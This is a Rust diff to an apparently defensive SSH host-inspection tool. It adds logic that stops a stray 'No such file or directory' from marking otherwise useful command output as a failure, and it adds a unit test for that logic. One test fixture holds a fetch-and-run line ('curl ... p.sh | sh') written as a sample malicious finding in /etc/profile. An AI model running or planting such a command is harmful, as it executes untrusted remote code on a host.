@@ -1676,23 +1676,52 @@ fn resolve_system_probe(output: &SshCommandOutput) -> CoreResult<SystemFamily> {
     })
 }
 
+/// True when the output is nothing but diagnostics: blank lines, the section
+/// headers the commands print, and the shell's own complaints.
+///
+/// Several commands read a list of paths, and a missing one puts "No such file
+/// or directory" in the middle of a perfectly good result. Judging the whole
+/// run by that phrase badges a result that carries the finding as a failure,
+/// and an operator skips it.
+fn has_only_diagnostics(bounded_output: &str) -> bool {
+    const DIAGNOSTICS: [&str; 6] = [
+        "command not found",
+        "not installed",
+        "no such file or directory",
+        "permission denied",
+        "operation not permitted",
+        "a password is required",
+    ];
+    !bounded_output.lines().any(|line| {
+        let trimmed = line.trim();
+        if trimmed.is_empty() || trimmed.starts_with("---") {
+            return false;
+        }
+        let lower = trimmed.to_ascii_lowercase();
+        !DIAGNOSTICS.iter().any(|marker| lower.contains(marker))
+    })
+}
+
 fn classify(output: &SshCommandOutput, bounded_output: &str) -> (CommandResultKind, bool, String) {
     let lower = bounded_output.to_ascii_lowercase();
+    let only_diagnostics = has_only_diagnostics(bounded_output);
     if output.timed_out {
         (CommandResultKind::Timeout, false, "命令执行超时".to_owned())
-    } else if lower.contains("permission denied")
-        || lower.contains("operation not permitted")
-        || lower.contains("a password is required")
-        || bounded_output.contains("权限不足")
+    } else if only_diagnostics
+        && (lower.contains("permission denied")
+            || lower.contains("operation not permitted")
+            || lower.contains("a password is required")
+            || bounded_output.contains("权限不足"))
     {
         (
             CommandResultKind::PermissionDenied,
             false,
             "权限不足或需要交互式认证".to_owned(),
         )
-    } else if lower.contains("command not found")
-        || lower.contains("not installed")
-        || lower.contains("no such file or directory")
+    } else if only_diagnostics
+        && (lower.contains("command not found")
+            || lower.contains("not installed")
+            || lower.contains("no such file or directory"))
     {
         (
             CommandResultKind::MissingCommand,
@@ -1815,6 +1844,30 @@ mod tests {
             .await
             .unwrap();
         (services, session, harness)
+    }
+
+    /// A command that reads a list of paths hits a missing one all the time.
+    /// Judging the whole run by that phrase badged a result carrying the
+    /// finding as a failure, and an operator skips a failed result.
+    #[test]
+    fn a_missing_path_inside_a_good_result_is_not_a_missing_command() {
+        let useful = "--- /etc/profile ---
+curl http://198.51.100.7/p.sh | sh
+cat: /etc/bashrc: No such file or directory";
+        assert!(!has_only_diagnostics(useful));
+
+        // A run that produced nothing but the complaint still reads as one.
+        assert!(has_only_diagnostics("bash: lsattr: command not found"));
+        assert!(has_only_diagnostics(
+            "--- 模块文件 ---
+
+cat: /etc/x: No such file or directory"
+        ));
+        assert!(has_only_diagnostics("Permission denied"));
+        assert!(!has_only_diagnostics(
+            "/usr/bin/find
+Permission denied"
+        ));
     }
 
     #[test]
